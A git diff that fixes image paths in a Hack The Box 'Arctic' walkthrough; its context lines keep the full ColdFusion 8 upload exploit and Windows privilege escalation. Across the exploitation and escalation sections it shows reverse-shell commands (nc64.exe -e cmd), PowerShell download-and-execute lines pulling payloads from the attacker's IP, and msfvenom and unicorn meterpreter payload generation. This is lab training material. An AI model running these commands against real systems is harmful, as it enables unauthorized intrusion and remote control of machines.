@@ -17,7 +17,7 @@ Hi folks, today I am going to solve an Easy rated hack the box machine which was
 nmap -sV -sC -oA nmap/artic 10.10.10.11
 ```
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Arctic/Screenshots/nmap.png)
+![](/Windows/Windows-Easy/Arctic/Screenshots/nmap.png)
 
 ```sh
  nmap -sV -sC -oA nmap/arctic 10.10.10.11                                                                                          ─╯
@@ -43,29 +43,29 @@ port[49154]-msrpc
 
 so let go to the port which we do not now of `8500` and it revels a directory 
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Arctic/Screenshots/directory.png)
+![](/Windows/Windows-Easy/Arctic/Screenshots/directory.png)
 
 so when openning the `CFIDE` it revels certain file
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Arctic/Screenshots/Admin.png)
+![](/Windows/Windows-Easy/Arctic/Screenshots/Admin.png)
 
 so when checking each file by clicking the `Administrator` it opens and application called `Coldfusion` 
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Arctic/Screenshots/coldfusion.png)
+![](/Windows/Windows-Easy/Arctic/Screenshots/coldfusion.png)
 so we test some default credential but does not return any thing so we do a `searchsploit ` to search for `coldfusion 8`
 
 ```sh
 searchsploit coldfusion 8 
 ```
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Arctic/Screenshots/searchsploit.png)
+![](/Windows/Windows-Easy/Arctic/Screenshots/searchsploit.png)
 
 we find that their are a bunch of exploit but what is most interesting is the one that can be done with `metasploit` 
 
 # Exploitation
 
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Arctic/Screenshots/metasploit.png)
+![](/Windows/Windows-Easy/Arctic/Screenshots/metasploit.png)
 
 ```sh
 show option
@@ -75,17 +75,17 @@ set LHOST 10.10.14.9
 set LPORT 4444
 ```
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Arctic/Screenshots/failed.png)
+![](/Windows/Windows-Easy/Arctic/Screenshots/failed.png)
 
 running that it failes because of the amount of time it takes for the session to respond so what will do is to examine the exploit in burpsuite so that we can be able to interact with the exploit. So we add another proxy listner so that we can listen from the our metasploit.
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Arctic/Screenshots/burp.png)
+![](/Windows/Windows-Easy/Arctic/Screenshots/burp.png)
 
 Now we change our `RHOSTs` from the metasploit so that we can intercept on the exploit to eamine how it was going to execute it. 
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Arctic/Screenshots/proxies.png)
+![](/Windows/Windows-Easy/Arctic/Screenshots/proxies.png)
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Arctic/Screenshots/burpexpoit.png)
+![](/Windows/Windows-Easy/Arctic/Screenshots/burpexpoit.png)
 
 
 now we can see the request it trying to make 
@@ -96,7 +96,7 @@ POST /CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?
 
 so  where the exploit came in is `Zu.jsp%00` which is a string termination. Now we send the exploit ia burp and we can see on the Response that a sucess message
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Arctic/Screenshots/burprespone.png)
+![](/Windows/Windows-Easy/Arctic/Screenshots/burprespone.png)
 
 Now we set a listener and navigate to that file 
 
@@ -104,17 +104,17 @@ Now we set a listener and navigate to that file
 nc -nvlp 4444
 ```
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Arctic/Screenshots/navigate.png)
+![](/Windows/Windows-Easy/Arctic/Screenshots/navigate.png)
 
 we get a reverseshell back
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Arctic/Screenshots/reverse.png)
+![](/Windows/Windows-Easy/Arctic/Screenshots/reverse.png)
 
 # Privillage Escalation
 
 Now we check for systeminfo to check for any `hotfixes`
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Arctic/Screenshots/systeminfo.png)
+![](/Windows/Windows-Easy/Arctic/Screenshots/systeminfo.png)
 
 Now we search and find that their is script that checks for vulnerablitities of missing software patches for local privilege escalation vulnerabilities. [sherlork](https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1) now we save the script and be able to execute if so that we can run.
 
@@ -124,7 +124,7 @@ from the script just copy the function find Allvulns and put at the end of the s
 powershell "IEX(New-Object Net.webclient).downloadString('http://10.10.14.9:8000/sherlork.ps1')"
 ```
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Arctic/Screenshots/sherlork.png)
+![](/Windows/Windows-Easy/Arctic/Screenshots/sherlork.png)
 
 ## MS15-051 UPLOAD
 
@@ -134,11 +134,11 @@ From `sherlork` we can then upload an `Ms15-051` exe so that we can execute the 
 powershell "(new-object System.Net.WebClient).Downloadfile('http://10.10.14.9:8000/Ms15.exe','Ms15.exe')"
 ```
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Arctic/Screenshots/MS15.png)
+![](/Windows/Windows-Easy/Arctic/Screenshots/MS15.png)
 
 Then when we execute it with `whoami` we get that we can execute `NT\Authority`
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Arctic/Screenshots/whoami.png)
+![](/Windows/Windows-Easy/Arctic/Screenshots/whoami.png)
 
 isnce we can execute some command using that we need a permanet shell that is easy to use so what we can do is to download a 64 `nc` so that we can use it to execute a reverse shell into the root user. [nc](https://github.com/int0x33/nc.exe/blob/master/nc64.exe) so we upload the `nc64.exe` so that by using it we can be able to get a root privillage.
 
@@ -152,15 +152,15 @@ so we create a listner and also run this code
 .\Ms15.exe "nc64.exe -e cmd 10.10.14.9 1339"
 ```
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Arctic/Screenshots/ms15ex.png)
+![](/Windows/Windows-Easy/Arctic/Screenshots/ms15ex.png)
 
 and just by that we get the root privillage.
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Arctic/Screenshots/rootpriv.png)
+![](/Windows/Windows-Easy/Arctic/Screenshots/rootpriv.png)
 
 and just by that we can get the user flag in `C:\users\tolis\desktop\user.txt` and root flag on 
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Arctic/Screenshots/flags.png)
+![](/Windows/Windows-Easy/Arctic/Screenshots/flags.png)
 ## METERPRETER
 
 it execute but nothing of impormtance so what we do is to be able to load a meterpreter shell with this exploit form [unicorn](https://github.com/trustedsec/unicorn/blob/master/unicorn.py)  or using `msvenom`
@@ -169,7 +169,7 @@ it execute but nothing of impormtance so what we do is to be able to load a mete
 msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.9 lport=4242 -f exe > shell.exe 
 ```
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Arctic/Screenshots/msvenom.png)
+![](/Windows/Windows-Easy/Arctic/Screenshots/msvenom.png)
 
 so we set a listner so as to listern for the shell
 
@@ -182,7 +182,7 @@ set LPORT 4242
 run
 ```
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Arctic/Screenshots/metapreter.png)
+![](/Windows/Windows-Easy/Arctic/Screenshots/metapreter.png)
 
 now we run this to the session of cold fusion
 
@@ -190,21 +190,21 @@ now we run this to the session of cold fusion
 powershell "(new-object System.Net.WebClient).Downloadfile('http://10.10.14.9:8000/shell.exe','shell.exe')"
 ```
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Arctic/Screenshots/exploitdownload.png)
+![](/Windows/Windows-Easy/Arctic/Screenshots/exploitdownload.png)
 
 from the python server we see that it has uploaded the shell
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Arctic/Screenshots/pyhonserver.png)
+![](/Windows/Windows-Easy/Arctic/Screenshots/pyhonserver.png)
 
 so we run the shell.exe to get the meterpreter
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Arctic/Screenshots/shell.png)
+![](/Windows/Windows-Easy/Arctic/Screenshots/shell.png)
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Arctic/Screenshots/meterpreter.png)
+![](/Windows/Windows-Easy/Arctic/Screenshots/meterpreter.png)
 
 it running a 32bit meterpreter 
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Arctic/Screenshots/32Bit.png)
+![](/Windows/Windows-Easy/Arctic/Screenshots/32Bit.png)
 
 now we send the session to the background so that we can use `Suggester`  to search for exploits 
 
@@ -217,13 +217,13 @@ set SESSION 1
 run
 ```
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Arctic/Screenshots/suggester.png)
+![](/Windows/Windows-Easy/Arctic/Screenshots/suggester.png)
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Arctic/Screenshots/potentialexploits.png)
+![](/Windows/Windows-Easy/Arctic/Screenshots/potentialexploits.png)
 
 now we save the exploit in some files and we go back to be able to use meterpreter of 64 version
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Arctic/Screenshots/migratec.png)
+![](/Windows/Windows-Easy/Arctic/Screenshots/migratec.png)
 
 so we are going to migrate to `conhost`
 
@@ -231,11 +231,11 @@ so we are going to migrate to `conhost`
 migrate 1164
 ```
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Arctic/Screenshots/migrateto.png)
+![](/Windows/Windows-Easy/Arctic/Screenshots/migrateto.png)
 
 so its now on 64 metrepreter so we will run again suggester
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Arctic/Screenshots/64bit.png)
+![](/Windows/Windows-Easy/Arctic/Screenshots/64bit.png)
 
 i decide to use this exploit `ms16_075`
 
@@ -248,7 +248,7 @@ set LHOST 10.10.14.9
 set LPORT 1347
 ```
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Arctic/Screenshots/ms075.png)
+![](/Windows/Windows-Easy/Arctic/Screenshots/ms075.png)
 
 and you get the privillage shell witn `NT/Authority`
 
@@ -260,7 +260,7 @@ python unicorn.py windows/meterpreter/reverse_tcp 10.10.14.9 31337
 
 it generates two file and instruction on starting metasploit.
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Arctic/Screenshots/unicorn.png)
+![](/Windows/Windows-Easy/Arctic/Screenshots/unicorn.png)
 
 ```sh
 msfconsole -r unicorn.rc
@@ -268,7 +268,7 @@ msfconsole -r unicorn.rc
 
 it starts metapreter listenning 
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Arctic/Screenshots/exploit.png)
+![](/Windows/Windows-Easy/Arctic/Screenshots/exploit.png)
 
 
 so we save the content of  `powershell_attack.txt` to a new file called the exploit.html and remove the powershell so that we can be able to make it executable by inline code
